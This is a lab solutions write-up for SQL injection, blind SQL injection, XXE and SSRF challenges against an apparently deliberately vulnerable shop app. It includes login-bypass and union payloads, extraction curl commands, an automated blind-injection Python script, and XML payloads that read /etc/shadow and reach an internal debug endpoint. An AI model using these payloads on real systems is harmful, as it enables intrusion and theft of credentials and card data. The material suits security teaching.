# Lab 03: SQL Injection & XXE - Solutions

---

# 1. SCHOGGI: SQL Injection on Login Form

## Challenge Overview

**Goal**: Access the first user in the database, then escalate to admin via SQL injection.

**Endpoint**: `POST /api/login`

---

## Vulnerability

| Vulnerability     | Description                                   |
| ----------------- | --------------------------------------------- |
| **SQL Injection** | Username concatenated directly into SQL query |

---

## Attack Chain

### Step 1: Analyze the Login Request

```http
POST /api/login HTTP/1.1
Content-Type: application/json

{"username":"test","password":"test"}
```

### Step 2: Understand the Backend Query

Assumed SQL:

```sql
SELECT * FROM users WHERE username='<input>' AND password_hash='<hashed_password>'
```

**Key insights**:

- Password is hashed before query execution → injection must target the **username field**
- App only reads `result[0]` (first row) → even if query returns all users, only first one is used

### Step 3: Login as First User

**Payload:**

```
Username: ' OR 1=1 LIMIT 0,1#
Password: anything
```

**Resulting SQL:**

```sql
SELECT * FROM users WHERE username='' OR 1=1 LIMIT 0,1#' AND password_hash='...'
```

| Component   | Purpose                        |
| ----------- | ------------------------------ |
| `' OR 1=1`  | Always true, returns all users |
| `LIMIT 0,1` | Return only the first row      |
| `#`         | Comment out rest of query      |

> **Note**: `LIMIT` is optional here since app takes `result[0]` anyway. But it's required in Step 4 to skip to admin.

**Result**: Logged in as **alice** (first user in database)

### Step 4: Login as Admin

Without `LIMIT`, app always gets first user (alice). To reach admin, use `LIMIT offset,1` to control which row becomes `result[0]`:

```
' OR 1=1 LIMIT 4,1#   ← Skip 4 rows, return row 5
```

Iterate: `LIMIT 0,1` (alice) → `LIMIT 1,1` (bob) → ... → `LIMIT 4,1` (peggy ✓)

**Result**: Row 4 (5th user) is admin **peggy**

---

## Answers

| Question   | Answer            |
| ---------- | ----------------- |
| First user | **alice**         |
| Admins     | **peggy, victor** |

---

# 2. SCHOGGI: Union-Based SQL Injection

## Challenge Overview

**Goal**: Extract usernames, password hashes, and credit card numbers via the search functionality.

**Endpoint**: `POST /api/search`

---

## Vulnerability

| Vulnerability     | Description                                        |
| ----------------- | -------------------------------------------------- |
| **SQL Injection** | Search input inserted into LIKE clause unsanitized |

---

## Attack Chain

### Step 1: Analyze the Search Request

```http
POST /api/search HTTP/1.1
Content-Type: application/json

{"search":"choco"}
```

**Response:**

```json
{
  "0": {
    "description": "Awesome chocolate cake",
    "img": "cake1.jpg",
    "name": "Choco",
    "pid": 1,
    "price": 17
  }
}
```

**Assumed SQL:**

```sql
SELECT * FROM products WHERE name LIKE '%choco%'
```

### Step 2: Determine Column Count

`UNION` requires both queries to have the **same column count**. Use `ORDER BY n` to probe - errors when `n` exceeds column count:

```sql
choco' ORDER BY 1#   → OK
choco' ORDER BY 5#   → OK
choco' ORDER BY 6#   → Error (only 5 columns exist)
```

**Result**: Table has **5 columns**

### Step 3: Identify Output Positions

```sql
test' UNION SELECT 'A','B','C','D','E'#
```

Maps to: `pid`, `name`, `description`, `img`, `price`

### Step 4: Enumerate Tables

```bash
curl -X POST -H 'Content-Type: application/json' \
  --data-raw $'{"search":"choco\' UNION SELECT NULL, table_name, NULL, NULL, NULL FROM information_schema.tables WHERE table_schema = DATABASE()#"}' \
  https://<host>/api/search
```

> **Note**: Using `$'...'` allows `\'` for literal single quotes in bash.

**Found tables**: `comments`, `orders`, `products`, `users`

### Step 5: Enumerate Columns

`GROUP_CONCAT()` merges all rows into one comma-separated string:

```bash
curl -X POST -H 'Content-Type: application/json' \
  --data-raw $'{"search":"choco\' UNION SELECT NULL, GROUP_CONCAT(column_name), NULL, NULL, NULL FROM information_schema.columns WHERE table_name=\'users\'#"}' \
  https://<host>/api/search
```

**Found columns**: `address`, `credit_card`, `password_hash`, `phone`, `picture`, `role`, `uid`, `username`

### Step 6: Extract User Data

`CONCAT_WS(':',...)` joins columns with a separator (`:` here):

```bash
curl -X POST -H 'Content-Type: application/json' \
  --data-raw $'{"search":"choco\' UNION SELECT NULL, CONCAT_WS(\':\',username,password_hash,credit_card), NULL, NULL, NULL FROM users#"}' \
  https://<host>/api/search
```

---

## Extracted Data

| Username | Password Hash                                                      | Credit Card         |
| -------- | ------------------------------------------------------------------ | ------------------- |
| alice    | `765adadbce1bcddb3bcbdbf7c8e312b5f3fd6b1fa278b8d884eb1cb8552fb1a1` | 2034 8857 0007 8024 |
| bob      | `985089972f3b4fc822a99bb38b6051935954944265f932a88e6e265bb9d2f90c` | 1325 4455 6767 9810 |
| charlie  | `5cb7285acef8307dd824faa96b4956971730641083237f393bded9591ff10eae` | 2028 4889 0003 9887 |
| eve      | `abbf8e6e2dd434cfa8545f7972045ef7fdf28a1e2a0fda258776d8189ed11875` | 4987 6439 4973 7403 |
| mallory  | `522c804c591605b0d9b27483b16b6227caa4dfeecd725c459e3de9de635fb228` | 2025 6655 4475 3991 |
| peggy    | `a0fc1cc4cfee7292d7d285aedb1ef3845332b64b04340ce6e3ee87f483396af4` | (empty)             |
| victor   | `59fe46987db46666b335c749636abb06ca23f73fc10bb943066e660ddc7410f7` | 2024 1968 4466 0002 |

---

## Answer: Charlie's Data

| Field         | Value                                                              |
| ------------- | ------------------------------------------------------------------ |
| Password Hash | `5cb7285acef8307dd824faa96b4956971730641083237f393bded9591ff10eae` |
| Credit Card   | `2028 4889 0003 9887`                                              |

---

# 3. SCHOGGI: Blind SQL Injection

## Challenge Overview

**Goal**: Extract mallory's credit card number using blind SQL injection on the login form.

**Endpoint**: `POST /api/login`

---

## Why "Blind"?

In Challenge 2, we used `UNION SELECT` to directly see data in the response. **That won't work here** because:

- The login endpoint only returns "success" or "error" messages
- No query results are displayed on the page

**Blind = we can't see the data, but we can ask yes/no questions about it.**

---

## The Problem

We want mallory's credit card, but all we get from the login is:

- "Invalid user or password" (user exists, wrong password)
- "Error during login" (user doesn't exist)

How do we extract data when we can only see these two messages?

---

## Attack Chain

### Step 1: Discover the Two Different Responses

Testing the login form:

| Username | Password | Response                   | What it means        |
| -------- | -------- | -------------------------- | -------------------- |
| `alice`  | `wrong`  | "Invalid user or password" | User found in DB     |
| `asdfgh` | `wrong`  | "Error during login"       | User NOT found in DB |

**Key insight**: The app leaks whether a user exists or not!

### Step 2: Confirm SQL Injection Exists

Try: `alice'-- ` as username (note the space after `--`)

```
Username: alice'--
Password: anything
```

**Expected if NO injection**: App searches for literal user `alice'-- ` → doesn't exist → "Error during login"

**Actual response**: "Invalid user or password"

**This means**: The `'-- ` was interpreted as SQL! The query became:

```sql
SELECT * FROM users WHERE username='alice'-- ' AND password_hash='...'
                                          ↑ everything after this is commented out
```

So it just searched for `alice` (who exists) → "Invalid user or password"

### Step 3: Build a Yes/No Question Machine (The "Oracle")

Now the clever part. We can inject `AND (some_condition)` to ask yes/no questions:

```sql
-- Our injection
alice' AND (1=1)--

-- Becomes
SELECT * FROM users WHERE username='alice' AND (1=1)-- '...
```

| Condition | Is it TRUE? | Row returned? | Response                   |
| --------- | ----------- | ------------- | -------------------------- |
| `1=1`     | Yes (1=1)   | Yes (alice)   | "Invalid user or password" |
| `1=0`     | No (1≠0)    | No rows       | "Error during login"       |

**We now have an oracle!**

- Response A = condition was TRUE
- Response B = condition was FALSE

We can replace `1=1` with ANY SQL condition and the app tells us if it's true!

### Step 4: Ask Questions About Mallory's Credit Card

Now we ask: "Does mallory's credit card start with X?"

```sql
mallory' AND (SELECT credit_card FROM users WHERE username='mallory') LIKE '0%'--
```

This translates to: "Find mallory AND check if her credit card starts with 0"

**Brute-force each character:**

| We ask...      | Payload (shortened)              | Response              | Answer   |
| -------------- | -------------------------------- | --------------------- | -------- |
| Starts with 0? | `mallory' AND (...) LIKE '0%'--` | Error during login    | NO       |
| Starts with 1? | `mallory' AND (...) LIKE '1%'--` | Error during login    | NO       |
| Starts with 2? | `mallory' AND (...) LIKE '2%'--` | Invalid user/password | **YES!** |

First character = **2**

Now we know it starts with 2, find the second character:

| We ask...       | Payload                           | Answer   |
| --------------- | --------------------------------- | -------- |
| Starts with 20? | `mallory' AND (...) LIKE '20%'--` | **YES!** |

Keep going: `202` → YES, `2025` → YES, `2025 ` → YES (space), etc.

### Step 5: Full Extraction

Repeat until no more characters match:

```
2 → 20 → 202 → 2025 → 2025  → 2025 6 → ... → 2025 6655 4475 3991
```

---

## Answer

| Field              | Value                 |
| ------------------ | --------------------- |
| First 4 characters | **2025**              |
| Full credit card   | `2025 6655 4475 3991` |

---

## Automation Script (Optional)

Doing this manually is tedious. Here's a script:

```python
#!/usr/bin/env python3
import requests

URL = "https://<host>/api/login"
CHARSET = "0123456789 "

def ask_oracle(prefix):
    """Returns TRUE if mallory's CC starts with prefix"""
    payload = f"mallory' AND (SELECT credit_card FROM users WHERE username='mallory') LIKE '{prefix}%'-- "
    r = requests.post(URL, json={"username": payload, "password": "x"})
    return "Invalid user or password" in r.text  # TRUE response

result = ""
while True:
    found = False
    for char in CHARSET:
        if ask_oracle(result + char):
            result += char
            print(f"Found so far: {result}")
            found = True
            break
    if not found:
        break  # No more characters match

print(f"Credit Card: {result}")
```

---

## TL;DR

1. App leaks user existence via different error messages
2. We inject `AND (condition)` to ask yes/no questions
3. We ask "does CC start with X?" for each character
4. Response tells us yes or no
5. Build up the credit card character by character

---

# 4. SCHOGGI: XML External Entity (XXE)

## Challenge Overview

**Goal**: Read `/etc/shadow` via XXE injection in the Bulk Order functionality.

**Credentials**: `alice` / `alice.123`

---

## Vulnerability

| Vulnerability | Description                                                |
| ------------- | ---------------------------------------------------------- |
| **XXE**       | XML parser processes external entities without restriction |

---

## Attack Chain

### Step 1: Get Sample XML

1. Login as `alice` / `alice.123`
2. Navigate to **BULK ORDER**
3. Download sample XML

```xml
<?xml version="1.0" encoding="UTF-8"?>
<order>
    <product>
        <name>Product Name</name>
        <quantity>25</quantity>
    </product>
</order>
```

### Step 2: Craft XXE Payload

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE order [
  <!ENTITY xxe SYSTEM "file:///etc/shadow">
]>
<order>
    <product>
        <name>&xxe;</name>
        <quantity>1</quantity>
    </product>
</order>
```

### Step 3: Upload and Extract

1. Save as `order.xml`
2. Upload via Bulk Order interface
3. `/etc/shadow` content appears in product name field

---

## Result

The contents of `/etc/shadow` are displayed in the order confirmation.

---

# 5. SCHOGGI: SSRF with XXE

## Challenge Overview

**Goal**: Access hidden internal `/debug` endpoint via Server-Side Request Forgery using XXE.

---

## Vulnerability

| Vulnerability | Description                                              |
| ------------- | -------------------------------------------------------- |
| **SSRF**      | XXE allows server to make requests to internal resources |

---

## Attack Chain

### Step 1: Discover Hidden Endpoint

```bash
gobuster dir -e -u https://<host> -w /usr/share/wordlists/dirb/common.txt
```

**Found**: `/debug` → Returns 403 Forbidden

Accessing in browser shows: "This endpoint can only be accessed from localhost"

### Step 2: Find the Internal Port

The `/debug` endpoint runs on an internal port. We know it's **8888** because:

- Challenge hint tells us (otherwise you'd brute-force common ports: 80, 8080, 8888, 3000, etc.)

### Step 3: Craft SSRF Payload

Use XXE to make the server request its own localhost:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE order [
  <!ENTITY ssrf SYSTEM "http://localhost:8888/debug">
]>
<order>
    <product>
        <name>&ssrf;</name>
        <quantity>1</quantity>
    </product>
</order>
```

### Step 4: Execute Attack

1. Upload crafted XML via Bulk Order
2. Server makes internal request to `localhost:8888/debug`
3. Response included in order confirmation

---

## Result

Debug endpoint reveals:

- **MySQL Password**
- **JWT Signing Key**
